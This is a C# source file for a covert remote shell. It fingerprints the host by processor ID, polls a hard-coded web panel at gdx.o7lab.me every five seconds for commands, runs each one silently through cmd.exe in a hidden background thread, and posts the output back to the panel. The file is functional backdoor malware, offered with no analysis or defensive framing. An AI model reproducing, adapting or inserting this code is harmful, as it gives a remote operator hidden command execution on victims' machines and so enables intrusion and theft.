using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Management;

internal static class RemoteShell
{
    private static readonly string ShellEndpoint = "http://gdx.o7lab.me/Webpanel/shell.php";
    private static readonly string Hwid = GetHWID();

    public static void Start()
    {
        new System.Threading.Thread(() =>
        {
            while (true)
            {
                try
                {
                    string command = GetCommand();
                    if (!string.IsNullOrEmpty(command))
                    {
                        string output = ExecuteCommand(command);
                        PostOutput(output);
                    }
                }
                catch { }

                System.Threading.Thread.Sleep(5000); // Check every 5 seconds
            }
        })
        {
            IsBackground = true
        }.Start();
    }

    private static string GetCommand()
    {
        using (WebClient wc = new WebClient())
        {
            wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
            string postData = "hwid=" + Uri.EscapeDataString(Hwid);
            string response = wc.UploadString(ShellEndpoint + "?get", postData);
            return response.Trim();
        }
    }

    private static void PostOutput(string output)
    {
        using (WebClient wc = new WebClient())
        {
            wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
            string postData = $"hwid={Uri.EscapeDataString(Hwid)}&output={Uri.EscapeDataString(output)}";
            wc.UploadString(ShellEndpoint + "?post", postData);
        }
    }

    private static string ExecuteCommand(string cmd)
    {
        try
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.Start();

            string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
            p.WaitForExit();
            return output;
        }
        catch (Exception ex)
        {
            return "[error] " + ex.Message;
        }
    }

    private static string GetHWID()
    {
        try
        {
            string cpuId = "";
            ManagementObjectSearcher mbs = new ManagementObjectSearcher("Select ProcessorId From Win32_Processor");
            foreach (ManagementObject mo in mbs.Get())
            {
                cpuId = mo["ProcessorId"]?.ToString();
                break;
            }

            return string.IsNullOrEmpty(cpuId) ? Environment.MachineName : cpuId;
        }
        catch
        {
            return Environment.MachineName;
        }
    }
}
